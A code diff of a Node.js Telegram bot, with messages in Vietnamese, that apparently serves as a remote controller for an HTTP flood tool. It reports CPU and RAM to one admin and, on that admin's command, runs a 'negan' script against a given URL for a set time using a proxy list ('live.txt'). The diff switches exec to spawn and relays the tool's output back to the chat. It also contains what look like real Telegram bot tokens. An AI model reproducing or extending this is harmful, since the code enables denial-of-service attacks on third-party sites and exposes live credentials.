@@ -1,32 +1,17 @@
-const TelegramBot = require('node-telegram-bot-api'), { exec } = require('child_process'), os = require('os');
-const token = '8129263243:AAETi5Zj1r2aC_LjrnKAIkf62yym7QBx-VI', bot = new TelegramBot(token, { polling: true }), adminId = 7371969470;
+const TelegramBot = require('node-telegram-bot-api'), { spawn } = require('child_process'), os = require('os');
+const token = '8129263243:AAFApr9Z8EapobeJQoPK9hF-FdjLekrxujc', bot = new TelegramBot(token, { polling: true }), adminId = 7371969470;
 
-// Hàm lấy thông số CPU và RAM
 const getSystemStats = () => {
     const totalMemory = os.totalmem(), freeMemory = os.freemem(), usedMemory = totalMemory - freeMemory, memoryUsagePercent = ((usedMemory / totalMemory) * 100).toFixed(2);
-    const cpuUsagePercent = (os.cpus().reduce((acc, cpu) => {
-        const total = Object.values(cpu.times).reduce((a, b) => a + b, 0), idle = cpu.times.idle;
-        return acc + (100 - (idle / total) * 100);
-    }, 0) / os.cpus().length).toFixed(2);
+    const cpuUsagePercent = (os.cpus().reduce((acc, cpu) => { const total = Object.values(cpu.times).reduce((a, b) => a + b, 0), idle = cpu.times.idle; return acc + (100 - (idle / total) * 100); }, 0) / os.cpus().length).toFixed(2);
     return { memoryUsagePercent, cpuUsagePercent, totalMemory: (totalMemory / 1024 / 1024 / 1024).toFixed(0), freeMemory: (freeMemory / 1024 / 1024 / 1024).toFixed(0) };
 };
 
-// Gửi thông số CPU và RAM mỗi 14 giây
 setInterval(() => {
     const stats = getSystemStats(), cpuFreePercent = (100 - parseFloat(stats.cpuUsagePercent)).toFixed(2);
-    bot.sendMessage(adminId, `
-Thông số đã sử dụng: 🚀 
-- CPU đã sử dụng: ${stats.cpuUsagePercent}%
-- RAM đã sử dụng: ${stats.memoryUsagePercent}%
-
-Thông số còn trống: ❤️
-- CPU còn trống: ${cpuFreePercent}%
-- RAM còn trống: ${stats.freeMemory}GB
-- Tổng RAM: ${stats.totalMemory}GB
-    `);
+    bot.sendMessage(adminId, `Thông số đã sử dụng: 🚀\n- CPU đã sử dụng: ${stats.cpuUsagePercent}%\n- RAM đã sử dụng: ${stats.memoryUsagePercent}%\n\nThông số còn trống: ❤️\n- CPU còn trống: ${cpuFreePercent}%\n- RAM còn trống: ${stats.freeMemory}GB\n- Tổng RAM: ${stats.totalMemory}GB`);
 }, 14000);
 
-// Xử lý lệnh từ admin
 bot.on('message', (msg) => {
     const chatId = msg.chat.id, text = msg.text;
     if (chatId !== adminId) return bot.sendMessage(chatId, 'Bạn không có quyền thực hiện lệnh này.');
@@ -36,10 +21,9 @@ bot.on('message', (msg) => {
     if (!host.startsWith('http://') && !host.startsWith('https://')) return bot.sendMessage(chatId, 'URL không hợp lệ! Cần có http:// hoặc https://.');
     const command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
     console.log(`[DEBUG] Lệnh được thực thi: ${command}`);
-    exec(command, (error, stdout, stderr) => {
-        if (error) console.error(`[DEBUG] Lỗi khi thực thi lệnh: ${error.message}`);
-        if (stderr) console.error(`[DEBUG] Lỗi từ stderr: ${stderr}`);
-        if (stdout) console.log(`[DEBUG] Kết quả từ stdout: ${stdout}`);
-    });
-    bot.sendMessage(chatId, `Lệnh đã được gửi Successfully: ${command}`);
+    const child = spawn('node', ['./negan', '-m', 'GET', '-u', host, '-p', 'live.txt', '--full', 'true', '-s', time]);
+    bot.sendMessage(chatId, `🚀 Lệnh đã được gửi thành công: ${command}`);
+    child.stdout.on('data', (data) => { console.log(`[DEBUG] stdout: ${data.toString()}`); bot.sendMessage(chatId, `[stdout] ${data.toString()}`); });
+    child.stderr.on('data', (data) => { console.error(`[DEBUG] stderr: ${data.toString()}`); bot.sendMessage(chatId, `[stderr] ${data.toString()}`); });
+    child.on('close', (code) => { console.log(`[DEBUG] Lệnh đã kết thúc với mã thoát: ${code}`); bot.sendMessage(chatId, `✅ Lệnh đã hoàn thành với mã thoát: ${code}`); });
 });
